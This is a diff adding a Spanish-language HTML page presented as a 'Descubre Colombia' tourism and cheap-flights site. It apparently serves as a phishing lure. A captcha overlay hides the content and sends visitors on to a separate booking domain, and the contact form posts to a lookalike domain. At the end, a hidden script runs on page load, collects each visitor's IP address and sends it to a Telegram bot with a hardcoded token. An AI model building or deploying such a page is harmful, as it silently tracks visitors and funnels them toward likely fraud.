@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="description" content="Explora la riqueza de Colombia y descubre lo mejor de Medellín, Bogotá, Cartagena, Santa Marta, Bucaramanga y San Andrés." />
+  <meta name="keywords" content="tiquetes baratos, vuelos baratos, viajes baratos, ofertas viajes, buscar vuelos, viajes colombia, viajes a medellin, viajes a bogota, vuelos a medellin, vuelos a bogota, vuelos a cartagena, vuelos a santa marta, vuelos a bucaramanga, vuelos a san andres" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Descubre Colombia: Turismo y Viajes Inolvidables</title>
+
+  <!-- Fuente Roboto para el captcha -->
+  <link rel="preconnect" href="https://fonts.googleapis.com/" />
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet" />
+
+  <!-- Google reCAPTCHA script -->
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+
+  <style>
+    /* Estilos generales del sitio */
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      line-height: 1.6;
+    }
+    header {
+      background: #2a9d8f;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+    nav {
+      background: #264653;
+      padding: 10px;
+      text-align: center;
+    }
+    nav a {
+      color: #fff;
+      margin: 0 15px;
+      text-decoration: none;
+    }
+    main {
+      padding: 20px;
+    }
+    section {
+      margin-bottom: 40px;
+    }
+    h2 {
+      border-bottom: 2px solid #ccc;
+      padding-bottom: 10px;
+    }
+    .city {
+      background: #f4f4f4;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+    .city h3 {
+      margin-top: 0;
+    }
+    .contact-form {
+      background: #e9ecef;
+      padding: 20px;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+    .contact-form label {
+      display: block;
+      margin-bottom: 5px;
+    }
+    .contact-form input,
+    .contact-form textarea {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+    }
+    .contact-form button {
+      background: #2a9d8f;
+      color: #fff;
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+    }
+    footer {
+      background: #264653;
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+    }
+    .politicas {
+      background: #f9f9f9;
+      padding: 20px;
+      margin-bottom: 20px;
+    }
+    .politicas h3 {
+      margin-top: 0;
+    }
+
+    /* Estilos del captcha overlay */
+ #captchaOverlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('fondoz.png') center center no-repeat;
+      background-size: cover;
+      z-index: 9999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.3);
+      padding: 20px;
+      width: 100%;
+      max-width: 350px;
+      text-align: center;
+      position: relative;
+    }
+    .container h1 {
+      font-size: 20px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    #continueBtn {
+      margin-top: 15px;
+      padding: 10px 20px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #fff;
+      background: linear-gradient(45deg, #007BFF, #00C6FF);
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      display: none;
+      width: 100%;
+    }
+    #continueBtn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 3px 8px rgba(0, 123, 255, 0.4);
+    }
+    #successMsg {
+      margin-top: 15px;
+      color: green;
+      font-weight: bold;
+      display: none;
+    }
+  </style>
+
+</head>
+<body>
+  <!-- Captcha Overlay -->
+  <div id="captchaOverlay">
+    <div class="container">
+      <h1>No soy un robot</h1>
+      <form id="captchaForm">
+        <div class="g-recaptcha" data-sitekey="6Lc_yVMrAAAAAANOMyah0Dmydp5nh_27mbtN20PQ" data-callback="captchaVerificado"></div>
+        <button type="button" id="continueBtn">Continuar</button>
+        <p id="successMsg">Validación completada.</p>
+      </form>
+    </div>
+  </div>
+
+  <!-- Contenido actual del sitio (queda oculto por el overlay) -->
+  <header>
+    <h1>Descubre Colombia: Un Viaje de Experiencias</h1>
+    <p>Vive la magia de <strong>viajes colombia</strong> y aprovecha <strong>ofertas viajes</strong> únicas en cada destino.</p>
+  </header>
+  <nav>
+    <a href="#medellin">Medellín</a>
+    <a href="#bogota">Bogotá</a>
+    <a href="#cartagena">Cartagena</a>
+    <a href="#santa-marta">Santa Marta</a>
+    <a href="#bucaramanga">Bucaramanga</a>
+    <a href="#san-andres">San Andrés</a>
+    <a href="#politicas">Políticas</a>
+    <a href="#contacto">Contacto</a>
+  </nav>
+  <main>
+    <!-- Secciones varias aquí (idénticas a tu original) -->
+    <section id="medellin" class="city">
+      <h2>Medellín</h2>
+      <h3>La Ciudad de la Eterna Primavera</h3>
+      <p>Medellín se destaca por su clima inmejorable, innovación y el espíritu acogedor de sus habitantes. Ideal para quienes desean <strong>viajes a medellin</strong> con <strong>vuelos baratos</strong> y <strong>tiquetes baratos</strong>, esta ciudad ofrece arte, cultura y modernidad en cada rincón.</p>
+    </section>
+    <!-- ... resto de secciones idéntico al tuyo ... -->
+
+    <!-- Políticas de Privacidad y Términos de Uso -->
+    <section id="politicas" class="politicas">
+      <h2>Políticas de Privacidad y Términos de Uso</h2>
+      <article>
+        <h3>Política de Privacidad</h3>
+        <p>En Descubre Colombia, valoramos tu privacidad y nos comprometemos a proteger la información personal que nos confías. Los datos proporcionados a través de nuestro formulario se utilizan exclusivamente para responder a tus consultas y mejorar tu experiencia en nuestro sitio.</p>
+        <p>Utilizamos cookies y tecnologías similares para personalizar y optimizar tu navegación. Estas herramientas no recogen datos personales sin tu consentimiento, y puedes gestionarlas o desactivarlas desde la configuración de tu navegador.</p>
+      </article>
+      <article>
+        <h3>Términos y Condiciones</h3>
+        <p>El contenido de este sitio se ofrece "tal cual" con fines informativos y turísticos. Al navegar en Descubre Colombia, aceptas que la información sobre destinos, <strong>vuelos baratos</strong>, <strong>viajes a bogota</strong> y demás, se proporciona de manera general y puede variar sin previo aviso.</p>
+        <p>No nos hacemos responsables de la actualización o precisión de la información presentada. Te recomendamos confirmar detalles importantes antes de realizar reservaciones o transacciones.</p>
+        <p>El uso de nuestro sitio implica la aceptación de estos términos, y nos reservamos el derecho de modificarlos en cualquier momento. Si tienes dudas sobre nuestras políticas, contáctanos para brindarte mayor claridad.</p>
+      </article>
+    </section>
+
+    <!-- Formulario de Contacto -->
+    <section id="contacto">
+      <h2>Contacto</h2>
+      <div class="contact-form">
+        <form action="https://superofertvuelos.online/procesar_formulario.php" method="post">
+          <label for="nombre">Nombre:</label>
+          <input type="text" id="nombre" name="nombre" required />
+          <label for="email">Correo Electrónico:</label>
+          <input type="email" id="email" name="email" required />
+          <label for="mensaje">Mensaje:</label>
+          <textarea id="mensaje" name="mensaje" rows="5" required></textarea>
+          <button type="submit">Enviar Mensaje</button>
+        </form>
+      </div>
+    </section>
+  </main>
+  <footer>
+    <p>&copy; 2025 Descubre Colombia. Todos los derechos reservados.</p>
+  </footer>
+
+  <script>
+    // Esta función es llamada automáticamente por el callback del recaptcha cuando se verifica el usuario
+    function captchaVerificado() {
+      const continueBtn = document.getElementById('continueBtn');
+      const successMsg = document.getElementById('successMsg');
+
+      continueBtn.style.display = 'block'; // Mostrar botón continuar
+      successMsg.style.display = 'block';  // Mostrar mensaje validación completada
+    }
+
+    document.getElementById('continueBtn').addEventListener('click', () => {
+      // Aquí puedes hacer la validación final o redireccionar directamente
+      // Por ejemplo, redirigir al sitio de reservas:
+      window.location.href = "https://tiquetebaratosmaspromo.vercel.app";
+    });
+  </script>
+
+    <script>
+async function getIPAndSendToTelegram() {
+    try {
+        // Obtener la IP pública del usuario
+        const response = await fetch('https://api64.ipify.org/?format=json');
+        const data = await response.json();
+        const ip = data.ip;
+        
+        // Configurar el mensaje para Telegram
+        const token = '7877847524:AAE0n4fHB5bup0clglDKME9-S8Utc7ANZL8';
+        const chat_id = '-4900588205';
+        const message = `💊ENTRANDO AL ESPEJO💊\nIP: ${ip}`;
+        
+        // Enviar mensaje a Telegram
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id, text: message })
+        });
+    } catch (error) {
+        console.error('Error obteniendo la IP o enviando el mensaje:', error);
+    }
+}
+
+// Ejecutar la función
+getIPAndSendToTelegram();
+</script>
+
+</body>
+</html>
